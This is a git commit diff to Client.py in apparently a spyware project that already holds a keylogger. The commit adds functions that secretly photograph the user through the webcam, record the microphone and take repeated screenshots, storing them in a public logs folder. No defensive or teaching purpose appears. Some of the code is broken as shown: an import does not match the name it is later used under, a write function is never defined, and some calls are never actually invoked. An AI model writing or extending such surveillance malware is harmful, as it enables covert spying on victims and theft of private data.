c44057bd0133393c703b3673e88ac56efb599c55
Ark _Ang3l <118340058+ark4ng3l@users.noreply.github.com>
2023-09-21 15:18:18 +0330

    Update Client.py

--- V1.0/Client.py
+++ V1.0/Client.py
@@ -1,7 +1,12 @@
 import os
+import cv2
+import time
+import pathlib
 import logging
 from pynput.keyboard import Key, Listener
 import logging
+import sounddevice
+import imagegrab
 
 def encrypt():
     from cryptography.fernet import Fernet
@@ -67,3 +72,34 @@ def keylogger():
     with Listener(on_press=on_press) as listener :
         listener.join()
 
+
+def webcam(file_path):
+    pathlib.Path('C:/Users/Public/Logs/WebcamPics').mkdir(parents=True, exist_ok=True)
+    cam_path = file_path + 'WebcamPics\\'
+    cam = cv2.VideoCapture(0)
+
+    for x in range(0, 10):
+        ret, img = cam.read()
+        file = (cam_path  + '{}.jpg'.format(x))
+        cv2.imwrite(file, img)
+        time.sleep(5)
+
+    cam.release                                     # Closes video file or capturing device
+    cv2.destroyAllWindows
+
+def microphone(file_path):
+    for x in range(0, 5):
+        fs = 44100
+        seconds = 10
+        myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
+        sounddevice.wait()                          # To check if the recording is finished
+        write_rec(file_path + '{}mic_recording.wav'.format(x), fs, myrecording)
+        
+def screenshot(file_path):
+    pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
+    screen_path = file_path + 'Screenshots\\'
+
+    for x in range(0,10):
+        pic = ImageGrab.grab()
+        pic.save(screen_path + 'screenshot{}.png'.format(x))
+        time.sleep(5)                               # Gap between the each screenshot in sec
